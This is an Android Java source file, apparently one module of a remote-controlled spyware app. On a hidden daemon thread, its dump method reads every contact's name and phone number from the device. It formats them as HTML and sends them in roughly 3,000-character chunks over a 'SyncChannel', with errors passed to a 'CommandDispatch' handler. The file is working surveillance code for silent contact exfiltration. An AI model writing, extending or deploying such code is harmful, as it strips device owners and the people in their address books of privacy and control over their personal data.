// language: Java, file: ContactSync.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;

public class ContactSync {

    public static void dump() {
        Thread t = new Thread(ContactSync::dumpSync, "v2-contacts");
        t.setDaemon(true);
        t.start();
    }

    static void dumpSync() {
        Context c = SyncChannel.ctx;
        if (c == null) return;
        if (c.checkSelfPermission(Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            SyncChannel.send("<i>err: READ_CONTACTS not granted</i>");
            return;
        }
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[] {
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                },
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if (cur == null) { SyncChannel.send("<i>contacts: null cursor</i>"); return; }
            int total = cur.getCount();
            StringBuilder b = new StringBuilder();
            b.append("<b>Contacts</b> (").append(total).append(")\n\n");
            int i = 0;
            while (cur.moveToNext()) {
                String name = cur.getString(0);
                String num = cur.getString(1);
                b.append("• <b>").append(SyncChannel.esc(name == null ? "?" : name))
                 .append("</b> — <code>").append(SyncChannel.esc(num == null ? "?" : num))
                 .append("</code>\n");
                i++;
                if (i % 50 == 0 && b.length() > 3000) {
                    SyncChannel.send(b.toString());
                    b.setLength(0);
                }
            }
            if (b.length() > 0) SyncChannel.send(b.toString());
        } catch (Throwable t) {
            CommandDispatch.err(t.getMessage());
        } finally {
            if (cur != null) try { cur.close(); } catch (Throwable ignored) {}
        }
    }
}